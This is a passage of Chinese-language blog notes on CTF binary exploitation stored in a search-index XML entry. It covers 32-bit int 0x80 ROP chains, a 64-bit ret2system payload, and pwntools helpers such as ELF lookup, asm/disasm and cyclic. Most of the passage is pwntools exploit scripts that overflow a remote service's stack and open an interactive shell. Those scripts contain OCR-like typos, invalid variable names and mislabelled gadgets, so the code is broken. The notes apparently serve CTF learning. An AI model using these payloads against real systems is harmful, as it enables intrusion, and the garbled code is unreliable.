class="string">"/bin/sh"</span>)</span><br></pre></td></tr></table></figure>

<h3 id="无system"><a href="#无system" class="headerlink" title="无system"></a>无system</h3><p>找出溢出点后可使用<br><code>ROPgadget --binary pwn名字 | grep &quot;int 0x80&quot;</code><br>来寻找可使用的gadget  ， <strong>-binary是搜索的目录，-only是搜索的内容</strong> ，同样还可以寻找pppr<br><code>ROPgadget --binary pwn名字 --only &quot;pop|ret&quot;</code><br><strong>使用的地址避免出现0a这样的字符，例如0x080a150a！！！</strong></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'0.0.0.0'</span>, <span class="number">10001</span>)</span><br><span class="line">ppppr = <span class="number">0x080a150a</span>       <span class="comment">#pop eax; pop ebx; pop esi; pop edi; ret</span></span><br><span class="line">pppr = <span class="number">0x080733b0</span>        <span class="comment">#pop edx; pop ecx; pop ebx; ret</span></span><br><span class="line">int <span class="number">80</span> = <span class="number">0x08071005</span>      <span class="comment">#int 0x80</span></span><br><span class="line">binsh = <span class="number">0x080f1a20</span>       <span class="comment">#first_ name address ,溢出点</span></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">32</span>         <span class="comment">#padding</span></span><br><span class="line">payload += p32(pppr)     <span class="comment">#pop eax; pop ebx; pop esi; pop edi; ret</span></span><br><span class="line">payload += p32(<span class="number">0xb</span>)      <span class="comment">#eax= 0xb</span></span><br><span class="line">payload += p32(binsh)    <span class="comment">#ebx = &amp;("/bin/sh")</span></span><br><span class="line">payload += p32(<span class="number">0</span>)        <span class="comment">#esi=0</span></span><br><span class="line">payload += p32(<span class="number">0</span>)        <span class="comment">#edi=0</span></span><br><span class="line">payload += p32(pppr)     <span class="comment">#pop edx; pop ecx; pop ebx; ret</span></span><br><span class="line">payload += p32(<span class="number">0</span>)        <span class="comment">#edx=0</span></span><br><span class="line">payload += p32(<span class="number">0</span>)        <span class="comment">#ecx = 0</span></span><br><span class="line">payload += p32(binsh)    <span class="comment">#ebx = &amp;("/bin/sh")</span></span><br><span class="line">payload += p32(int_ <span class="number">80</span>)  <span class="comment">#int Bx80</span></span><br><span class="line">io. sendline(<span class="string">"/bin/sh"</span>)  <span class="comment">#first_ name里面存储”/bin/sh"</span></span><br><span class="line">io. sendline(<span class="string">"A"</span>)        <span class="comment">#随便输入</span></span><br><span class="line">io. sendline(<span class="string">"A"</span>)        <span class="comment">#随便输入</span></span><br><span class="line">io. sendline(<span class="string">"y"</span>)        <span class="comment">#选y进入函数first_ day_ corps()</span></span><br><span class="line">io. sendline(<span class="string">"2"</span>)        <span class="comment">#选项2进入change major()， 触发栈溢出</span></span><br><span class="line"></span><br><span class="line">io . sendl ine(payload)</span><br><span class="line">io. interactive()</span><br></pre></td></tr></table></figure>

<h2 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h2><p>在x64下通常参数从左到右依次放在 <strong>rdi,rsi,rdx,rcx,r8,r9</strong></p>
<h3 id="有sys无binsh有sh"><a href="#有sys无binsh有sh" class="headerlink" title="有sys无binsh有sh"></a>有sys无binsh有sh</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'0.0.0.0'</span>,<span class="number">10000</span>)</span><br><span class="line">system_add = <span class="number">0x4007505</span></span><br><span class="line">binsh = <span class="number">0x400236</span>            <span class="comment"># 字符串“sh”在内存中的位置</span></span><br><span class="line">pop_rdi = ox400582          <span class="comment"># pop rdi ; retn</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"A"</span>*<span class="number">88</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system_add)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="使用ELF"><a href="#使用ELF" class="headerlink" title="使用ELF"></a>使用ELF</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">e = ELF(<span class="string">'./example'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(e.address)  </span><br><span class="line"><span class="keyword">print</span> hex(e.symbols[<span class="string">'write'</span>]) <span class="comment"># 找到write的地址</span></span><br><span class="line"><span class="keyword">print</span> hex(e.got[<span class="string">'write'</span>]) <span class="comment"># 找到write的got</span></span><br><span class="line"><span class="keyword">print</span> hex(e.plt[<span class="string">'write'</span>]) <span class="comment"># 找到write的plt</span></span><br><span class="line">offset = e.symbols[<span class="string">'system'</span>] - e.symbols[<span class="string">'printf'</span>] <span class="comment"># calculate offset</span></span><br><span class="line">binsh_address = next(e.search(<span class="string">'/bin/sh\x00'</span>)) <span class="comment"># find address which contains /bin/sh</span></span><br></pre></td></tr></table></figure>

<h1 id="py"><a href="#py" class="headerlink" title="py"></a>py</h1><h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><p>汇编：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;asm(<span class="string">'nop'</span>)</span><br><span class="line"><span class="string">'\x90'</span></span><br></pre></td></tr></table></figure>

<p>进行反汇编：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> disasm(<span class="string">'6a0258cd80ebf9'</span>.decode(<span class="string">'hex'</span>))</span><br><span class="line">   <span class="number">0</span>:   <span class="number">6</span>a <span class="number">02</span>                   push   <span class="number">0x2</span></span><br><span class="line">   <span class="number">2</span>:   <span class="number">58</span>                      pop    eax</span><br><span class="line">   <span class="number">3</span>:   cd <span class="number">80</span>                   int    <span class="number">0x80</span></span><br><span class="line">   <span class="number">5</span>:   eb f9                   jmp    <span class="number">0x0</span></span><br></pre></td></tr></table></figure>

<h3 id="cyclic"><a href="#cyclic" class="headerlink" title="cyclic"></a>cyclic</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;cyclic(<span class="number">40</span>)  <span class="comment"># 生成40个字节长的字符串</span></span><br><span class="line">&gt;&gt;&gt;cyclic_find(<span class="string">'aaaa'</span>)  <span class="comment"># 寻找此字符串的偏移</span></span><br></pre></td></tr></table></figure>

<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><p><a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a></p>
<center> ~~未完待续~~ </center>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
